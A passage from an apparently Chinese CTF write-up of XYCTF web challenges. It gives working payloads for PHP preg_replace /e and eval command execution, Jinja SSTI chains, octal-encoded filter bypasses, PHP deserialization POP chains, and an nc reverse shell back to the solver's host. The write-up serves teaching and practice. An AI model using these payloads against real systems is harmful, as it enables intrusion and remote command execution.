class="hljs-string">&quot;XYCTF_550102591&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>payload：val1&#x3D;240610708&amp;val2&#x3D;s878926199a&amp;md5&#x3D;0e215962017&amp;XY&#x3D;QNKCDZO&amp;XYCTF&#x3D;QNKCDZO</strong><br>显示 LLeeevvveeelll222.php&#x3D;&#x3D;&gt; 打开<br><code>if (isset($_POST[&#39;a&#39;]) &amp;&amp; !preg_match(&#39;/[0-9]/&#39;, $_POST[&#39;a&#39;]) &amp;&amp; intval($_POST[&#39;a&#39;])) &#123;  echo &quot;操作你O.o&quot;;  echo preg_replace($_GET[&#39;a&#39;],$_GET[&#39;b&#39;],$_GET[&#39;c&#39;]);</code></p><p>POST_a用数组绕过+++++e模式<br><strong>payload：?a&#x3D;&#x2F;a&#x2F;e&amp;b&#x3D;system(‘cat &#x2F;flag’)&amp;c&#x3D;&#x2F;a&#x2F;e————POST: a[]&#x3D;1</strong><br><em>OVER</em></p><h2 id="ezMake-命令执行绕过-shell变量替换符读文件"><a href="#ezMake-命令执行绕过-shell变量替换符读文件" class="headerlink" title="ezMake(命令执行绕过+shell变量替换符读文件 )"></a>ezMake(命令执行绕过+shell变量替换符读文件 )</h2><p><strong>利用shell变量替换符$(&lt;file)读文件</strong></p><p>直接echo $(&lt;flag)</p><p>发现不行</p><p>试试echo $$(&lt;&#x2F;flag)可行</p><h2 id="ez-Make-读文件-文件名过滤"><a href="#ez-Make-读文件-文件名过滤" class="headerlink" title="ez?Make(读文件+文件名过滤)"></a>ez?Make(读文件+文件名过滤)</h2><p>通过shell正则匹配到flag文件,用more读取(大概禁了f,l,a,g ,&#x2F;字符)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cd .. &amp;&amp;cd .. &amp;&amp;cd .. &amp;&amp;more [^e][^b][^b][^b]<br></code></pre></td></tr></table></figure><h2 id="εZ-¿м-Kε¿-报错读文件-makefile自动变量"><a href="#εZ-¿м-Kε¿-报错读文件-makefile自动变量" class="headerlink" title="εZ?¿м@Kε¿?(报错读文件+makefile自动变量)"></a>εZ?¿м@Kε¿?(报错读文件+makefile自动变量)</h2><p>Makefile 自动变量<br>在Makefile中，大家经常会见到类似@ 、 @、@、^、$&lt;这种类型的变量。这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：<br>$@：目标<br>$^：所有目标依赖<br>$&lt;：目标依赖列表中的第一个依赖<br>$?：所有目标依赖中被修改过的文件<br>这里第一个依赖是就是 &#x2F;flag<br>(注意&#x3D;&#x3D;坑点&#x3D;&#x3D;，之前不要试$&gt;，会导致重定向输出创建新文件了，直接影响了后续判断为依赖是<br>FLAG,卡了半天读不到&#x2F;flag)</p><p>配合报错带出即可 参照前面ezMake<br>坑点:这里两个 $$ 才代表一个 $</p><p>payload:$$(&lt;$&lt;)</p><h2 id="easymd5-文件比较"><a href="#easymd5-文件比较" class="headerlink" title="easymd5(文件比较)"></a>easymd5(文件比较)</h2><p>将JPG文件甩在工具fastcoll上<br>生成2个文件<br><em>OVER</em></p><h2 id="说英文的复读-机弱密码-SSTI的简单绕过-requests"><a href="#说英文的复读-机弱密码-SSTI的简单绕过-requests" class="headerlink" title="说英文的复读(机弱密码+SSTI的简单绕过(requests))"></a>说英文的复读(机弱密码+SSTI的简单绕过(requests))</h2><p>1.抓包爆破&#x3D;&#x3D;&gt;密码：asdqwe<br>2.fuzz&#x3D;&gt;发现SSTI</p><p>requests,args,.没有过滤</p><p>直接<code>requests</code>绕过关键词过滤<code>|attr()</code>绕过<code>[]</code>过滤</p><p>?sentence&#x3D;(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()啊啊&amp;a&#x3D;<strong>class</strong>&amp;b&#x3D;<strong>base</strong>&amp;c&#x3D;<strong>subclasses</strong>&amp;d&#x3D;<strong>getitem</strong>&amp;e&#x3D;<strong>init</strong>&amp;f&#x3D;<strong>globals</strong>&amp;g&#x3D;popen&amp;h&#x3D;cat &#x2F;flag</p><p>或者</p><p>[[lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()&amp;glo&#x3D;<strong>globals</strong>&amp;ge&#x3D;<strong>getitem</strong>&amp;o&#x3D;os&amp;po&#x3D;popen&amp;cmd&#x3D;cat &#x2F;flag&amp;re&#x3D;read</p><h2 id="zzl的护理小课堂-js代码审计"><a href="#zzl的护理小课堂-js代码审计" class="headerlink" title="zzl的护理小课堂(js代码审计)"></a>zzl的护理小课堂(js代码审计)</h2><p>var flagXhr &#x3D; new XMLHttpRequest();<br>                        flagXhr.open(‘GET’, ‘flag.php’, true);<br>                        flagXhr.onreadystatechange &#x3D; function() {<br>                            if (flagXhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; flagXhr.status &#x3D;&#x3D;&#x3D; 200) {<br>                                var flag &#x3D; flagXhr.responseText;<br>                                document.getElementById(‘scoreDisplay’).innerText &#x3D; “Flag: “ + flag;<br>                            }<br>                        };<br>                        flagXhr.send(); &#x2F;&#x2F; 发送请求获取 flag</p><p>控制台：<br>var flagXhr &#x3D; new XMLHttpRequest();<br>                        flagXhr.open(‘GET’, ‘flag.php’, true);<br>                        flagXhr.onreadystatechange &#x3D; function() {<br>                            if (flagXhr.readyState &#x3D;&#x3D;&#x3D; 4 &amp;&amp; flagXhr.status &#x3D;&#x3D;&#x3D; 200) {<br>                                var flag &#x3D; flagXhr.responseText;<br>                                document.getElementById(‘scoreDisplay’).innerText &#x3D; “Flag: “ + flag;<br>                            }<br>                        };<br>                        flagXhr.send();<br><em>OVER</em></p><h2 id="牢大"><a href="#牢大" class="headerlink" title="牢大"></a>牢大</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Kobe</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) &gt; <span class="hljs-number">13</span>) &#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;see you again~&quot;</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;肘死你&quot;</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val_name</span> =&gt; <span class="hljs-variable">$val_val</span>) &#123;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="hljs-variable">$val_val</span>)) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;what can i say&quot;</span>;  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>;  <br>&#125;  <br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">Kobe</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;#man,&quot;</span> . <span class="hljs-variable">$cmd</span>  . <span class="hljs-string">&quot;,manba out&quot;</span>;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;  <br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#man,&quot;</span> . <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot;,mamba out&quot;</span>);<br></code></pre></td></tr></table></figure><p>有长度限制，好说strlen($cmd) &gt; 13<br>考虑 反引号执行系统命令(只有两个字符) 等价于shell_exec(); 这个命令是没有回显的<br> 做个转接头 逃逸 命令长度限制<br><code>$_GET[1]</code>;</p><p>在php中是单行注释符 用 %0a换行即可绕过（到下一行了）</p><p>cmd&#x3D;%0a<code>$_GET[1]</code>;%23</p><p>没有回显   考虑反弹shell</p><p>首先是这道题的<strong>pyload:?cmd&#x3D;%0a<code>$_GET[1]</code>;%23&amp;1&#x3D;nc</strong> 你的映射的ip地址，你映射的端口 $’\57\142\151\156\57\142\141\163\150’<br>首先我们以pyload，一个一个分析<br>1.前面的get[1]不用多说就是负责绕过长度的嘛，否则也实行不了想要的命令对吧<br>2.后面为什么用nc反弹，而不能用ls，cat这些出信息，首先用的是反引号，得前面加print或者echo什么把信息打印出来（但这里echo被过滤掉了）<br>然后用print的话就无法构造$_GET，所以就nc反弹了，如果不知道什么事nc反弹那得要学一下渗透什么的，那知识点涉及还是有点多的<br>不过就是要用nc肯定没错，既然他无法回显信息，那我只要连接到我攻击机上回显不就行了吗，然后这里就要涉及到内网穿透，就是将自己的攻击机ip地址映射到公网，你可以使用</p><h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><p>payload:八进制绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>];<br>    <span class="hljs-variable">$cmd_char</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$cmd</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$cmd_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123; <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$char</span>, <span class="hljs-variable">$white_list</span>))&#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;really ez?&quot;</span>); <br>        &#125; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>; <br>&#125; <br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>**?cmd&#x3D;$%27\143\141\164%27&lt;$%27\57\146\154\141\147%27**———%27-&gt; ‘</p><p><a href="https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/">https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/</a><br>1.列举了白名单，数字可用，想到八进制（十六进制有字母）<br>2.不能纯八进制绕过，会被当做字符串，没有意义，要用**$’八进制’<strong>包裹<br>3.空格在linux系统里面用八进制是不可以的，</strong>可以替代空格<strong>，就是会转义但是不能执行（比如：会被转义成cat &#x2F;flag，但是不执行）</strong>空格不能用八进制绕过**，正好题目给了&lt;——————–如果不给&lt; 肯定会给别的，就是找替代品<br>4.于是被分成两部分，用&lt;连接</p><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];  <br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];  <br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];  <br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];  <br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure><p>结构 new 一个类(参数)-&gt;执行方法<br> 利用Error类的静态方法 getMessage返回任意字符结合php的动态执行特性</p><p>?a&#x3D;Error&amp;aa&#x3D;system&amp;b&#x3D;Error&amp;bb&#x3D;cat &#x2F;flag&amp;c&#x3D;getMessage</p><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>构造POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;token=&amp;<span class="hljs-variable language_">$this</span>-&gt;password;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;password =<span class="hljs-number">1</span>;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>题目将token的值弄成了md5(mt_rand())，我们要想传值给password，使其与token相等是不可能的，那么就只有把password的地址传给token，使password跟着token的改变而改变。</p><p>知识点：</p><p>php按地址传参，我们只需要让token和passowrd指向同一块地址就可以了。</p><p>本地运行后得到O:4:”Flag”:2:{s:5:”token”;i:1;s:8:”password”;R:2;}</p><p>传参进入下一步，得到fpclosefpclosefpcloseffflllaaaggg.php</p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"> </span>&#123;<br><br>  <span class="hljs-variable language_">$this</span>-&gt;mack-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O&lt;br&gt;&quot;</span>;<br><br>  <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;luo;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$wang1</span>,<span class="hljs-variable">$wang2</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"> </span>&#123;<br><br>   <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o&lt;br&gt;&quot;</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$this</span>-&gt;lao-&gt;chen) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable language_">$this</span>-&gt;lao-&gt;chen;<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"> </span>&#123;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br> &#125;<br><br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;num!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;<br><br>  &#125;<br><br> &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br><br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>; <br><br>​    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;xxxxx&quot;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>();<br><br><span class="hljs-variable">$a</span>-&gt;name-&gt;lao=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><br><span class="hljs-variable">$a</span>-&gt;name-&gt;lao-&gt;luo=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><br><span class="hljs-variable">$a</span>-&gt;name-&gt;lao-&gt;luo-&gt;mack=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>post得到</p><p>saber_master_saber_master.php  访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span 